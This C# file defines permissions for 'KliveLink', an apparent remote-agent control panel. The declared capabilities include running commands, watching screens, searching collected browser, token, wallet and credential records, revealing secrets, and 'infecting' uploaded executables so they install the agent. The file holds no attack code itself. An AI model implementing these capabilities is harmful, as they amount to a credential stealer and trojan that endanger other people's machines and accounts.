namespace Omnipotent.Profiles.Permissions
{
    [PermissionSet]
    public static class KliveLinkPerms
    {
        private static readonly PermissionGroup G = new("klivelink", "KliveLink");

        public static readonly PermissionDef AgentsView = G.Define("agents.view", "Agents", PermissionTier.Glance,
            "View connected computers", "Which remote computers are connected and their status.", ProfileRank.Klives);

        public static readonly PermissionDef AgentsInspect = G.Define("agents.inspect", "Agents", PermissionTier.Read,
            "Inspect computers", "System information, running processes and directory listings.", ProfileRank.Klives,
            implies: new[] { "agents.view" }, sensitive: true);

        public static readonly PermissionDef AgentsFiles = G.Define("agents.files", "Files", PermissionTier.Manage,
            "Transfer files", "Download files from and upload files to remote computers.", ProfileRank.Klives,
            implies: new[] { "agents.inspect" }, sensitive: true);

        public static readonly PermissionDef AgentsControl = G.Define("agents.control", "Control", PermissionTier.Critical,
            "Control computers", "Run processes and terminal commands, kill processes, watch the screen and disconnect.",
            ProfileRank.Klives, implies: new[] { "agents.inspect" }, sensitive: true);

        public static readonly PermissionDef AgentsDestroy = G.Define("agents.destroy", "Control", PermissionTier.Critical,
            "Uninstall agents", "Tell a remote agent to remove itself.", ProfileRank.Klives, implies: new[] { "agents.view" });

        public static readonly PermissionDef AgentsPurge = G.Define("agents.purge", "Control", PermissionTier.Critical,
            "Remove agents from Omnipotent", "Delete an agent and all of its commands, collection data and metadata from the server.",
            ProfileRank.Klives, implies: new[] { "agents.view", "agents.destroy" }, sensitive: true);

        public static readonly PermissionDef CollectionView = G.Define("collection.view", "Collection", PermissionTier.Glance,
            "View collection summaries", "See snapshot status, coverage and category counts for an agent.",
            ProfileRank.Klives, implies: new[] { "agents.view" }, sensitive: true);

        public static readonly PermissionDef CollectionSearch = G.Define("collection.search", "Collection", PermissionTier.Read,
            "Search collection records", "Search collected browser, token, wallet and credential records.",
            ProfileRank.Klives, implies: new[] { "collection.view" }, sensitive: true);

        public static readonly PermissionDef CollectionDownload = G.Define("collection.download", "Collection", PermissionTier.Manage,
            "Download collection data", "Reveal secrets and download encrypted collection bundles.",
            ProfileRank.Klives, implies: new[] { "collection.search" }, sensitive: true);

        public static readonly PermissionDef CollectionManage = G.Define("collection.manage", "Collection", PermissionTier.Critical,
            "Manage collection", "Start a collection, change its profile, or delete a snapshot.",
            ProfileRank.Klives, implies: new[] { "collection.download" }, sensitive: true);

        public static readonly PermissionDef AuditView = G.Define("audit.view", "Audit", PermissionTier.Read,
            "View command audit", "Read the immutable command and purge audit trail.",
            ProfileRank.Klives, implies: new[] { "agents.view" }, sensitive: true);

        public static readonly PermissionDef Infect = G.Define("infect", "Infect", PermissionTier.Critical,
            "Infect executables", "Upload an EXE and receive a copy that also installs KliveLink when run.",
            ProfileRank.Klives, implies: new[] { "agents.control" }, sensitive: true);
    }
}
